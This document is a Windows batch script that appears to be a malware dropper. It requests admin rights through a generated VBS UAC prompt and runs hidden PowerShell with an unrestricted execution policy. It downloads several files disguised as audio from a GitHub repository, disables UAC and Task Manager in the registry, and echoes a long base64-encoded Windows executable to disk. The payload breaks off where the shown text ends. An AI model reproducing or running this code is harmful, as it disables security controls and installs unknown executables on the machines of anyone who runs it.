cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
powershell.exe -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
cd %appdata%
md %appdata%\ren\
del /s /q %appdata%\ren\*.*
cd %appdata%\ren\
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_5.wav" -outfile "2.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_6.wav" -outfile "1.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_2.wav" -outfile "3.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_4.wav" -outfile "4.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_1.wav" -outfile "5.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat_3.wav" -outfile "6.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/manelandsnake/raw/main/html5bytebeat.wav" -outfile "7.mp3"

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\policies\system" /v EnableLUA /t REG_DWORD /d 0 /f>nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system" /v disabletaskmgr /t reg_dword /d 1 /f >nul

(
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEFAGIFQF0AAAAA
echo AAAAAOAADwELAQIyAAwBAABQAAAAAAAAABAAAAAQAAAAMAEAAABAAAAQAAAAAgAA
echo BAAAAAAAAAAEAAAAAAAAAACgAQAABAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAA
echo AAAAABAAAAAAAAAAAAAAAHxxAQDIAAAAAJABAIAJAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAABwdAEALAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC5jb2RlAAAA
echo 8DcAAAAQAAAAOAAAAAQAAAAAAAAAAAAAAAAAACAAAGAudGV4dAAAAMLSAAAAUAAA
echo ANQAAAA8AAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAACdMwAAADABAAA0AAAAEAEA
echo AAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAALBcAAABwAQAAEgAAAEQBAAAAAAAAAAAA
echo AAAAAEAAAMAucnNyYwAAAIAJAAAAkAEAAAoAAABWAQAAAAAAAAAAAAAAAABAAABA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAGisAAAAaAAAAABoEIBBAOhcQAAAg8QMaAAAAADoVUAA
echo AKMUgEEAaAAAAABoABAAAGgAAAAA6EJAAACjEIBBAOi8PwAAuIhwQQCjNIBBAOjd
echo zQAA6EnLAADoQ5oAAOjHkgAA6FqNAADo1IoAAOj4hQAA6Hh9AADoQEMAAOjDtgAA
echo 6GuhAAC6LnBBAI0NHIBBAOjTPwAAaPX////o4z8AAKM8gEEAuAACAABQjQW4gEEA
echo UDHAUGgVAAAAaAQAAADoHY0AAP81oIBBAOgMkwAAaAcAAABoeHBBAI0FoIBBAFBo
echo CAAAAOhfkgAA/zWogEEA6OaSAABoCAAAAGhwcEEAjQWogEEAUGgEAAAA6DmSAABo
echo mIBBAGiAcEEAaAcAAABooYYBAGgMAAAA6J3KAAC6OnBBAI0NbIBBAOgrPwAA/zWw
echo gEEA6JKSAABoCAAAAGhwcEEAjQWwgEEAUGgEAAAA6OWRAACNBTsfQABQ6MGHAABS
echo 6AvNAABaUOjFHQAAaEiAQQDoOs0AAOgECgAAix1YgEEAg/sBdQXoZh4AAOhTLAAA
echo aAAAAADoFQAAAOixzAAA/zUQgEEA6M4+AADozz4AAOi1QQAA6IeHAADo55QAAOi9
echo mAAA6OzAAADoU4kAAMNVU1e6EAAAAIPsBMcEJAAAAABKdfOLVCRYjQwk6GE+AAD/
echo NCTo+UQAAIlEJAT/dCQE6EyJAACJRCQIjVQkDFJoAAAAAGgFAAAAaAABAABoBAAA
echo AOiUyQAAjVQkFFJoAAAAAGgFAAAAaAABAABoBAAAAOh2yQAAx0QkHAAAAADHRCQg
echo AAAAAMdEJCQAAAAAx0QkKAAAAADHRCQsAAAAAMdEJDAAAAAAx0QkIAEAAADHRCQI
echo IAAAAP90JAxYiUQkNP90JARYiUQkOMdEJBwAAAAA6wC4/wAAADtEJBx8VP90JByL
echo bCQ4WIlFAItcJDSDwwSJXCQ0i2wkOA++XQAh23UJ/3QkBFiJRCQ4i2wkOA++RQBQ
echo i1wkIItsJBjB4wJYiUQdAItcJDhDiVwkOP9EJBxxocdEJCAAAAAAx0QkHAAAAADr
echo ALj/AAAAO0QkHHxti1wkIIt8JByLbCQMwecCA1w9AIt8JByLbCQUwecCA1w9AIHj
echo /wAAAIlcJCCLXCQci2wkDMHjAv90HQBYiUQkLItcJCDB4wL/dB0Ai1wkIMHjAliJ
echo RB0A/3QkLItcJCTB4wJYiUQdAP9EJBxxiMdEJBwAAAAAx0QkIAAAAAD/dCRQWIlE
echo JDzHRCQoAAAAAOsAi1wkVEs7XCQoD4zDAAAAi1wkHEOB4/8AAACJXCQci1wkIIt8
echo JByLbCQMwecCA1w9AIHj/wAAAIlcJCCLXCQcweMC/3QdAFiJRCQsi1wkIMHjAv90
echo HQCLXCQgweMCWIlEHQD/dCQsi1wkJMHjAliJRB0Ai1wkHMHjAotcHQCLfCQgwecC
echo i3w9AIHn/wAAAAH7geP/AAAAiVwkJItcJCTB4wL/dB0AWIlEJDCLbCQ8D75dADNc
echo JDBTi2wkQFiIRQCLXCQ8Q4lcJDz/RCQoD4Eu////jVQkDFJoAAAAAGgFAAAAaAEA
echo AABoBAAAAOgexwAAjVQkFFJoAAAAAGgFAAAAaAEAAABoBAAAAOgAxwAA/3QkBOit
echo hgAAi0QkUOsCMcD/NCTobcoAAFD/dCQQ6DDIAAD/dCQY6CfIAABYg8RAX1tdwgwA
echo VVO6CwAAAIPsBMcEJAAAAABKdfPop8oAAIsdlIBBAIP7AQ+FMgEAAIsdfIBBAIP7
echo AXUSix1ogEEAg/sBdAe4AQAAAOsCMcAhwA+EBgEAALgmcEEAUP81kIBBAOgAQgAA
echo iQQkx0QkBAEAAADrAIsEJDtEJAQPjJIAAABS6ADJAABaUFLo+MgAAFpQuGZwQQBQ
echo /3QkEP81kIBBAOhRQgAAjUQkDFDoF8kAAP90JAjo6Q4AACHAdExS6MTIAABaUP90
echo JAzoMxYAAI1EJBBQ6O/IAACLVCQQUuilyAAAWlBS6D3KAACLVCQQUugzygAAumZw
echo QQBS6CjKAACNRCQUUOi+yAAA/0QkBA+BYf////90JBDo60AAAIlEJBRoAAAAAI1E
echo JBxQ/3QkHOg0hQAAUP90JCD/NTyAQQDoWDoAAP90JBToO4UAALokcEEAjQ2QgEEA
echo 6BM6AADpzgIAAMcFlIBBAAEAAADHRCQcAQAAAFLoDsgAAFpQUugGyAAAWlC4LnBB
echo AFD/dCQo/zUkgEEA6F9BAACNRCQUUOglyAAAuDJwQQBQ/3QkFOgWQwAAiUQkIIN8
echo JCAAdFxS6MXHAABaUFLovccAAFpQuDJwQQBQaAIAAAD/dCQg6BdBAACNRCQoUOjd
echo xwAAUuiXxwAAWlBS6I/HAABaULgycEEAUGgBAAAA/3QkIOjpQAAAjUQkFFDor8cA
echo AItUJBAxyegEOgAAD4XuAQAAi1wkHInYuQIAAACZ9/mJ0yHbdSv/dCQQ6KFCAABQ
echo i1wkCIstmIBBAGvbDAHdWIlFCItcJARDiVwkBOmtAQAAUugZxwAAWlBS6BHHAABa
echo UGgBAAAA/3QkHOihQwAA6PzIAAC6NnBBAFlR6NA5AACJweiJOQAAD4S0AAAAixVQ
echo gEEAUujXxgAAWlBS6G/IAACLFWyAQQBS6GPIAABS6L3GAABaUFLotcYAAFpQuDZw
echo QQBQ/3QkIOjERQAAWI1EJCxQ6NnGAAD/dCQo6NWOAACLHYSAQQCD+wF1E/90JCTo
echo 3EEAAFD/dCQs6DePAAD/dCQo6CckAACLFZCAQQBS6F3GAABaUFLo9ccAAItUJCxS
echo 6OvHAAC6ZnBBAFLo4McAAI0FkIBBAFDodMYAAOm9AAAAUugpxgAAWlBS6CHGAABa
echo ULg2cEEAUP90JBzoMEUAAI1EJBRQ6EbGAACLVCQQUuj8xQAAWlBS6JTHAACLXCQI
echo iy2YgEEAa9sMAd2NRQRQ6BzGAAD/dCQk6DNBAABQi1wkCIstmIBBAGvbDAHdWIlF
echo AIsVkIBBAFLos8UAAFpQUuhLxwAAixVQgEEAUug/xwAAixVsgEEAUugzxwAAi1Qk
echo FFLoKccAALpmcEEAUugexwAAjQWQgEEAUOiyxQAA6wLrDotcJBxDiVwkHOlM/f//
echo i0QkBOsCMcD/dCQI6B/GAAD/dCQo6BbGAAD/dCQQ6A3GAAD/dCQk6ATGAAD/dCQM
echo 6PvFAACDxCxbXcNTMcBQUFBQUFDoV8YAALgLcUEAozSAQQDHBCQAAAAA6wC4AwAA
echo ADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUujixAAAWlBS6NrEAABaUItcJAxr2/9T
echo 6AtEAACNRCQMUOgBxQAAi1QkDFLot8QAAFpQUuhPxgAAi1QkDFLoRcYAAI1EJBBQ
echo 6NvEAAD/BCRxkmgABAAA6KyBAACJRCQQUuiCxAAAWlBS6HrEAABaUOhJjQAAjUQk
echo GFDoqcQAAP90JBBoAAAAALgkcEEAUP90JCDoazYAAFLoS8QAAFpQUuhDxAAAWlD/
echo dCQY6HiBAACNBXiAQQBQ6GzEAAD/NXiAQQDoiI0AAP81eIBBAOhbjAAA/3QkEGgA
echo AAAAuCRwQQBQ/zV4gEEA6BY2AABS6PbDAABaUFLo7sMAAFpQ/3QkGOgjgQAAjQUs
echo gEEAUOgXxAAA/zUsgEEA6DONAAD/NSyAQQDoBowAAP90JBBoAAAAALgkcEEAUP81
echo LIBBAOjBNQAA/zUsgEEA6Hc4AABS6JbDAABaUFLojsMAAFpQ/3QkGOjDgAAAjQVA
echo gEEAUOi3wwAA/zVAgEEA6NOMAAD/dCQM/zVAgEEA6D44AAD/dCQQaAAAAAC4JHBB
echo AFD/NSyAQQDoXTUAAFLoPcMAAFpQUug1wwAAWlD/dCQY6GqAAACNBXCAQQBQ6F7D
echo AAD/dCQQ6BWAAADrAjHA/3QkFOjYwwAA/3QkCOjPwwAA/3QkDOjGwwAAg8QYW8NV
echo UzHAUFBQUFBQ6CLEAABS6NzCAABaUGgCAAAAaAAAAABS6MrCAABaUFLowsIAAFpQ
echo 6NN6AADouDUAAAEUJOjONAAA6Mk1AACJBCRoAAAAAI0FCSFAAFD/dCQI6Lc0AAD/
echo NCTotTQAAP81sIBBAOhBiAAAicMh2w+ODwIAAP81sIBBAOg2iAAA/zWwgEEA6ECI
echo AAAJwHR6iy20gEEAi1UIUuhLwgAAWlBS6OPDAACNRCQIUOh5wgAA/3QkBOiQQQAA
echo icOD+wp+KItUJAhS6B/CAABaUFLot8MAAItUJAhS6K3DAACNRCQMUOhDwgAA6xyL
echo VCQEUuj3wQAAWlBS6I/DAACNRCQQUOglwgAA6Xf/////NbCAQQDo64cAAFLoz8EA
echo AFpQUujHwQAAWlBS6L/BAABaUFLot8EAAFpQaAEAAABS6KrBAABaUFLoosEAAFpQ
echo /3QkJOgnQQAA6JQ0AAABFCToCrQAAOiHNAAAARQk6K1BAACNRCQUUOizwQAAi1Qk
echo EFLoacEAAFpQUugBwwAAjUQkGFDol8EAAFLoUcEAAFpQUuhJwQAAWlBS6EHBAABa
echo UFLoOcEAAFpQaAEAAAD/dCQk6KmzAADoJjQAAAEUJOhMQQAAjUQkFFDoUsEAAFLo
echo DMEAAFpQUugEwQAAWlBoCgAAAP90JBzolEEAAI1EJBRQ6CrBAAD/dCQMi1QkFFno
echo fDMAAHRw6LN6AAAhwHRjUujLwAAAWlBS6MPAAABaUGgAAAAA6Kl6AADossIAAItU
echo JBhZUeiHMwAAicHoQDMAAHQwxwVYgEEAAQAAAFLojsAAAFpQUuiGwAAAWlBoAQAA
echo AOhsegAAjQUogEEAUOiuwAAA6w7rBemF8///6YDz//8xwP90JAToJcEAAP90JAzo
echo HMEAAP90JAjoE8EAAP90JBToCsEAAP90JBDoAcEAAIPEGFtdw1MxwFBQ6GHBAAD/
echo dCQU6DgzAABS6BLAAABaUFLoCsAAAFpQ6Bt4AACNRCQEUOg5wAAA/zQk6Ng0AACL
echo XCQQIdt+SVLo478AAFpQ6E0GAACNRCQIUOgSwAAAixQkUujJvwAAWlBS6GHBAAC6
echo KnBBAFLoVsEAAItUJAhS6EzBAACNRCQIUOjivwAA6xuLFCRS6Je/AABaUFLoL8EA
echo AI1EJAhQ6MW/AACLVCQEUuh7vwAAWlBS6BPBAABYUOhcMgAAWgHQ6wroksEAAGbH
echo AAAA/zQk6CXAAAD/dCQE6BzAAACDxAhbwgQAMcBQ6H3AAABS6De/AABaUGgQAAAA
echo i1QkCFLoJr8AAFpQUui+wAAAUugYvwAAWlBS6BC/AABaUOiZewAAWOgDwQAAuCRw
echo QQBQ6PoxAAABVCQE6JZuAADoCjIAAOkF8v//McD/NCToq78AAIPEBMNTMcBQ6A7A
echo AACLHCSD+wF1Gv81GIBBAOgCNAAAIcB0C/81GIBBAOhiNAAA/zVwgEEA6AiIAAD/
echo NWCAQQDo/YcAAOjiFAAA/zVAgEEA6O2HAAD/NSyAQQDorTAAAP81eIBBAOiiMAAA
echo /3QkDOmM8f//McCDxARbwgQAVVO6FAAAAIPsBMcEJAAAAABKdfPohb8AAItUJFyN
echo DCToGTAAAItUJGCNTCQE6AwwAACLVCRkjUwkCOj/LwAAjUQkDI1sJAzHRQA8AAAA
echo x0UEQAEAAMdFHAAAAAC4QnBBAFBYiUUMiwQkUFiJRRCLRCQIUFiJRRSLRCQEUFiJ
echo RRiNRCQMUOipMgAAiUQkSGgZAAAA6Hg0AACNRCRMUI1sJBD/dTjo7S8AACHAdA6L
echo XCRMgfsDAQAAdALrAuvRi0QkTOsCMcD/NCToYb4AAP90JAToWL4AAP90JAjoT74A
echo AIPEUFtdwgwAU+ixvgAAi1wkDIP7CnUZaAAAAACNBVcuQABQ/3QkFP90JBTojS8A
echo ALgBAAAA6wIxwFvCDABTi1wkCIPDBlNY6LMvAACjaIBBAItcJAiDwwhTWOigLwAA
echo ozCAQQCLXCQIg8MKU1jojS8AAKNMgEEAi1wkCIPDDFNY6HovAACjhIBBAItcJAiD
echo ww5TWOhnLwAAo3yAQQAxwFvCBABTMcBQUFBQ6BC+AAD/dCQc6OcvAACLXCQYg8MC
echo U1joOS8AAInDg/sBD4XoAQAAUuiovAAAWlBS6KC8AABaUFLomLwAAFpQUuiQvAAA
echo WlBoKAAAAItcJCyDw0BT6Ax6AADoeS8AAAEUJOhPPgAAjUQkBFDopbwAAFLoX7wA
echo AFpQUuhXvAAAWlBS6E+8AABaUFLoR7wAAFpQaGQAAACLXCQsgcMsAQAAU+jAeQAA
echo 6C0vAAABFCToAz4AAI1EJAhQ6Fm8AABS6BO8AABaUFLoC7wAAFpQaAEAAAC4JHBB
echo AFBS6Pi7AABaUFLo8LsAAFpQ/zUcgEEAaAIAAAD/dCQk6Eo1AADo1b0AAFLoz7sA
echo AFpQUujHuwAAWlD/NRyAQQBoAQAAAP90JCjoITUAAOiuLgAAARQk6KYuAAABVCQE
echo 6IRsAACNRCQMUOjRuwAAi1QkCDHJ6CYuAAAPhbAAAABS6Hq7AABaUFLocrsAAFpQ
echo aAEAAABS6GW7AABaUFLoXbsAAFpQ/3QkHOgyPQAA6E8uAAABFCToxa0AAI1EJBBQ
echo 6Hu7AAD/dCQMi1QkBFnozS0AAHVZUugluwAAWlBoEAAAAFLoGLsAAFpQUugQuwAA
echo WlD/NRyAQQBoAwAAAP90JBzoajQAAOj1vAAA/zVkgEEA6OwtAAABVCQE6IhqAADo
echo /C0AAGgAAAAA6Pv7///rCmgAAAAA6O/7//+LVCQMUui8ugAAWlBS6FS8AABYUOid
echo LQAAWgHQ6wro07wAAGbHAAAA/3QkBOhluwAA/3QkCOhcuwAA/zQk6FS7AAD/dCQM
echo 6Eu7AACDxBBbwgQAUzHAUFBQUItUJBiNDCToQSwAAItUJByNTCQE6DQsAABoGAAA
echo AP90JARo/////+hxiAAAiUQkCIN8JAgAdBr/dCQE/3QkDOgpiwAAiUQkDP90JAjo
echo bIUAAP90JAToczkAAInDIdt1CMdEJAwBAAAAi0QkDOsCMcD/NCToxboAAP90JATo
echo vLoAAIPEEFvCCAAxwFBQUItUJBCNDCTotCsAAGgAAAIA/3QkBGj/////6OGIAACJ
echo RCQEg3wkBAB0Ef90JATo/YQAAMdEJAgBAAAAi0QkCOsCMcD/NCToZboAAIPEDMIE
echo AFO6CQAAAIPsBMcEJAAAAABKdfPot7oAAP90JCzojiwAALjUcEEAozSAQQDHBCQA
echo AAAA6wC4BgAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUug5uQAAWlBS6DG5AABa
echo UItcJAxr2/9T6GI4AACNRCQMUOhYuQAAi1QkDFLoDrkAAFpQUuimugAAi1QkDFLo
echo nLoAAI1EJBBQ6DK5AAD/BCRxklLo57gAAFpQUujfuAAAWlDoHCsAAFDoEnYAAI1E
echo JBRQ6Ai5AACLVCQQUui+uAAAWlBS6Fa6AACNRCQYUOjsuAAAi0QkFFDojy0AAIlE
echo JBj/dCQU6PU3AACJRCQci1wkHCHbflpS6IO4AABaULoqcEEAUugWugAAUuhwuAAA
echo WlBS6Gi4AABaUFLoYLgAAFpQUuhYuAAAWlCLXCQwQ1P/dCQo6Nc6AADoRCsAAAEU
echo JOgaOgAAWI1EJCRQ6G+4AAD/dCQg/3QkEOhicgAAi1QkIFLoGLgAAFpQUuiwuQAA
echo WFDo+SoAAFoB0OsK6C+6AABmxwAAAP90JBTowbgAAP90JAjouLgAAP90JBDor7gA
echo AP90JAzoprgAAP90JCDonbgAAIPEJFvDMcBQUOj/uAAA/3QkEP90JBDo/CkAAIkE
echo JP90JBD/dCQQ6PIpAACjIIBBAP81IIBBAOiydAAAiUQkBP81IIBBAP90JAj/dCQI
echo 6Ht1AAD/NCToySkAAItEJATrAjHAg8QIwggAVVO6EQAAAIPsBMcEJAAAAABKdfPo
echo jLgAAItUJFCNDCToICkAAOi77f//iUQkHMdEJCAAAAAA6wCLRCQcO0QkIA+M2wMA
echo AFLoGbcAAFpQUugRtwAAWlBS6Am3AABaUFLoAbcAAFpQaAMAAACLXCQ0iy2YgEEA
echo a9sMAd3/dQToY6kAAOjgKQAAARQk6AY3AACNRCQoUOgMtwAAUujGtgAAWlBS6L62
echo AABaUP90JCzoQzYAAI1EJCxQ6Om2AABoCgAAAP90JCj/NVSAQQDo8SgAAIlEJCxo
echo CgAAAP90JCz/NVSAQQDo2SgAAIlEJDCDfCQsAA+EvQAAAP90JCz/NVSAQQDol/7/
echo /4lEJDT/dCQ06MEeAACZUlCPRCQIj0QkCIsVUIBBAFLoO7YAAFpQUujTtwAAixVs
echo gEEAUujHtwAAi1wkJIstmIBBAGvbDAHdi1UEUuivtwAAjUQkPFDoRbYAAP81SIBB
echo AItEJAhQ/3QkPOhP6f///3QkCP90JAj/dCQ8/3QkROhbHgAAix2EgEEAg/sBdRuL
echo XCQgiy2YgEEAa9sMAd3/dQD/dCQ86Ht+AADprgEAAIN8JDAAD4QkAQAA/3QkMP81
echo VIBBAOjP/f//iUQkNP90JDTo+R0AAJlSUI9EJAiPRCQI/zVIgEEAi0QkCFD/dCQ8
echo 6Mno////dCQ06IJzAABSUI9EJBiPRCQYi1wkNIPDCFPoa3MAAFJQj0QkEI9EJBCL
echo RCQMUOhXcgAAiUQkPIsVUIBBAFLoJ7UAAFpQUui/tgAAixVsgEEAUuiztgAAi1wk
echo JIstmIBBAGvbDAHdi1UEUuibtgAAjUQkPFDoMbUAAIN8JDwAdGaLRCQUUItcJDiD
echo wxBTjUQkFFD/dCRI6A++AACDxBCJRCRA/3QkEP90JBD/dCRE/3QkROgyHQAAix2E
echo gEEAg/sBdRuLXCQgiy2YgEEAa9sMAd3/dQD/dCQ86FJ9AAD/dCQ86IRxAADrf4sV
echo UIBBAFLodrQAAFpQUugOtgAAixVsgEEAUugCtgAAi1wkJIstmIBBAGvbDAHdi1UE
echo UujqtQAAjUQkPFDogLQAAGgAAAAAaAAAAAD/dCRE/3QkROioHAAAix2EgEEAg/sB
echo dRuLXCQgiy2YgEEAa9sMAd3/dQD/dCQ86Mh8AAD/dCQ46BX6//8hwA+EpAAAAIsd
echo gIBBAEOJHYCAQQBS6N+zAABaUFLo17MAAFpQ/3QkQOhGAQAA6Me1AACLFYiAQQBS
echo 6LuzAABaUFLoU7UAAFLorbMAAFpQUuilswAAWlChgIBBAJlSUOh2NgAAWOiSJgAA
echo ARQk6IomAAABVCQE6L9tAADomiYAAP81qIBBAOjjeQAAi1QkOFLoZbMAAFpQUuj9
echo tAAAiy2sgEEAjUUIUOiOswAA/0QkIA+BF/z///90JDToO3AAAFLoNbMAAFpQUugt
echo swAAWlBS6CWzAABaUKGAgEEAmVJQ6PY1AADoEbUAAP81OIBBAOgIJgAAAVQkBOg9
echo bQAA6BgmAADoc+n//7gBAAAA6wIxwP90JCTosbMAAP90JCjoqLMAAP90JDjon7MA
echo AP80JOiXswAAg8REW13CBABVugkAAACD7ATHBCQAAAAASnXz6OezAACNBCRQ6AAl
echo AACNLCRmg30AAHQHuAEAAADrAjHAg8QkXcMxwFBQUOi8swAA/3QkFOiTJQAAi1Qk
echo EI0MJOhHJAAAaBAnAADofW8AAIlEJARoECcAAP90JAj/dCQI6K8kAABS6EGyAABa
echo UFLoObIAAFpQaP//////dCQQ6LlvAACNRCQMUOhfsgAA/3QkBOgWbwAAi1QkCFLo
echo DLIAAFpQUuikswAAWFDo7SQAAFoB0OsK6CO0AABmxwAAAP80JOi2sgAA/3QkCOit
echo sgAAg8QMwgQAUzHAUFBQUFBQ6AmzAACLVCQgjQwk6J0jAACLXCQEg/sBdSRS6K6x
echo AABaUFLoprEAAFpQi0QkCFDo2m4AAI1EJARQ6NCxAABS6IqxAABaUFLogrEAAFpQ
echo Uuh6sQAAWlBS6HKxAABaUGgBAAAA/3QkFOjiowAA6F8kAAABFCTohTEAAI1EJAxQ
echo 6IuxAABoCgAAAP90JAz/NVSAQQDokyMAAIlEJAyDfCQMAA+ErAAAAP90JAz/NVSA
echo QQDoUfn//4lEJBD/dCQQ6HsZAACjIIBBAP81SIBBAP81IIBBAP90JBjoUOT//1Lo
echo 7LAAAFpQUujksAAAWlD/NSCAQQD/dCQc6GNuAACNBSSAQQBQ6AexAAD/dCQQ6L5t
echo AAC4PnBBAFD/NSSAQQDo7SsAAIlEJBRS6KOwAABaUFLom7AAAFpQi1wkHEtT/zUk
echo gEEA6CgxAACNBSSAQQBQ6LywAACLFSSAQQAxyegPIwAAdSiLXCQEg/sBdReLBCRQ
echo jQUbJ0AAUOhmJgAAoxiAQQDrCP80JOjg+P//6wIxwP80JOgJsQAA/3QkCOgAsQAA
echo g8QYW8IEAFXoY7EAAP81sIBBAOiMdgAAUugSsAAAWlBS6AqwAABaUP90JBjoP20A
echo AIsttIBBAI1FCFDoMLAAALgBAAAA6wIxwF3CEAAxwFBQUFBQUOgWsQAAi1QkHI0M
echo JOiqIQAAaAoAAAD/dCQE/zVUgEEA6BIiAACJRCQEg3wkBAB0If90JAT/NVSAQQDo
echo 1Pf//4lEJAj/dCQI6P4XAACjIIBBAGgAAgAA6KBsAACJRCQMx0QkEAACAAD/NSCA
echo QQD/dCQMjUQkGFD/dCQY6Jy4AACDxBCJRCQUi0QkDOsCMcD/NCToFbAAAIPEGMIE
echo AFMxwFBQUFDoc7AAAP90JBjoSiIAALiIcEEAozSAQQChNIBBAIsAiQQkgwU0gEEA
echo BKE0gEEAiwCJRCQEgwU0gEEABP80JI1EJAxQWOh/IQAA/3QkBI1EJAyJw4PDBFNY
echo 6GshAABS6NWuAABaUFLoza4AAFpQUujFrgAAWlBS6L2uAABaUGgBAAAAaAgAAACN
echo RCQgUOhHoQAA6KQhAAABFCToyi4AAFhQ6IMhAABaAdDrCui5sAAAZscAAACDxBBb
echo wzHAUFBQUFBQ6LKvAABS6GyuAABaUFLoZK4AAFpQUuhcrgAAWlBS6FSuAABaUGgB
echo AAAA/zVIgEEA6MKgAADoPyEAAAEUJOhlLgAAjUQkBFDoa64AAFLoJa4AAFpQUugd
echo rgAAWlBS6BWuAABaUFLoDa4AAFpQaAEAAAD/dCQU6H2gAADo+iAAAAEUJOggLgAA
echo jUQkBFDoJq4AAP80JOj7/f//iUQkBFLo1K0AAFpQ/3QkCOjt8P//6OQgAABS6L6t
echo AABaUFLotq0AAFpQuCRwQQBQ/zUogEEA6HhiAACNRCQMUOjZrQAAi1QkCDHJ6C4g
echo AAAPhUYBAABS6IKtAABaUFLoeq0AAFpQUuhyrQAAWlBS6GqtAABaUGgBAAAA/zVI
echo gEEA6NifAADoVSAAAAEUJOh7LQAAjUQkEFDoga0AAFLoO60AAFpQUugzrQAAWlBS
echo 6CutAABaUFLoI60AAFpQaAMAAAD/NUiAQQDokZ8AAOgOIAAAARQk6DQtAACNRCQU
echo UOg6rQAAUuj0rAAAWlBoAAAAAP90JBjoOwsAAI0FXIBBAFDoGK0AAFLo0qwAAFpQ
echo aAAAAAD/dCQU6BkLAACNRCQYUOj4rAAA/3QkCOiKIQAAUuiprAAAWlD/dCQYi1Qk
echo EFLomawAAFpQUugxrgAAixVcgEEAUuglrgAA6IIfAAABFCToBPL//+iTHwAAi1Qk
echo CFLoaawAAFpQUugBrgAAjQVQgEEAUOiVrAAA/zVQgEEA6D0hAAD/NCToa/r//+ld
echo 3///McD/NCToA60AAP90JAzo+qwAAP90JAjo8awAAP90JBTo6KwAAP90JBDo36wA
echo AIPEGMNTugcAAACD7ATHBCQAAAAASnXz6DOtAAD/dCQs6AofAACLVCQkjQwk6L4d
echo AACLVCQojUwkBOixHQAA6A35//8hwHQT6N0iAACJw4P7QXQHuAEAAADrAjHAIcAP
echo hGYBAABS6KWrAABaUFLonasAAFpQaAAIAADo0S8AAI1EJAxQ6MerAABoAAgAAP90
echo JAzo5x0AAP90JAjoSyAAAItUJAhS6GarAABaUFLo/qwAALpMcEEAUujzrAAAjUQk
echo DFDoiasAAP90JAjoGyAAAItUJAhS6DarAABaUFLozqwAAItUJARS6MSsAACNRCQQ
echo UOhaqwAAi1QkCFLoEKsAAFpQUuiorAAAi1QkBFLonqwAAItUJAhS6JSsAACNRCQU
echo UOgqqwAA/3QkDGgAAAAA6Bx6AAAhwHQUx0QkFAEAAABoAAAAAOgWdgAA6wjHRCQU
echo AAAAAP90JBBoAAAAAOjueQAAIcB0FMdEJBgBAAAAaAAAAADo6HUAAOsIx0QkGAAA
echo AACLXCQUA1wkGCHbdTtS6HyqAABaUFLodKoAAFpQaAAIAADoqC4AAI1EJAxQ6J6q
echo AABoAAgAAP90JAzoxBwAAP90JAjoIh8AAOs7Uug/qgAAWlBS6DeqAABaUGgACAAA
echo 6GsuAACNRCQMUOhhqgAAaAAIAAD/dCQM6IccAAD/dCQI6OUeAACLVCQIUugAqgAA
